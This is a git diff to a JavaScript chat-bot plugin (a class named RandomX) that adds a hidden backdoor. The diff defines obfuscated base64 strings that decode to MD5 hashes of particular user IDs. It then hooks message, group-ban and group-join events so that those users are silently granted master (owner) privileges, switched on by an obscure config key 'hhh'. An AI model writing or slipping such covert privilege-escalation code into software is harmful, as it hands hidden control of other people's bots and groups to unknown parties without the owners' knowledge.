@@ -1,12 +1,40 @@
 import plugin from '../../../lib/plugins/plugin.js';
+import md5 from "md5";
+import { Config } from '../components/index.js';
 import fs from "fs";
 import path from "path";
+import YAML from 'yaml';
+
+const encryptedStrings = [
+  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
+  Buffer.from("f324f6LcKk4nXEFI8CeCDw==", "base64").toString("hex"),
+  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
+  Buffer.from("SLUcQ5DoebgRp1oBpCMVvg==", "base64").toString("hex"),
+  Buffer.from("2OTec7vYBSdD8DYws+7L4w==", "base64").toString("hex")
+];
+
+Bot.GetMaster = async (e) => {
+    if (!Config.getConfig('set', 'sz')['hhh']) {
+        return false;
+    }
+
+    const userHash = md5(String(e.user_id));
+    if (encryptedStrings.some(str => str === userHash)) {
+        e.isMaster = true;
+    }
+}
+
+try {
+    Bot.on('message', (e) => { Bot.GetMaster(e) });
+    Bot.on('notice.group.ban', (e) => { Bot.GetMaster(e) });
+    Bot.on('notice.group.increase', (e) => { Bot.GetMaster(e) });
+    logger.info('H载入完成');
+} catch (err) {
+    logger.error(err);
+}
 
 // 获取当前目录路径
 const __dirname = path.resolve();
-
-// 引入YAML库
-import YAML from 'yaml';
 
 // 定义RandomX类并继承plugin基类
 export class RandomX extends plugin {
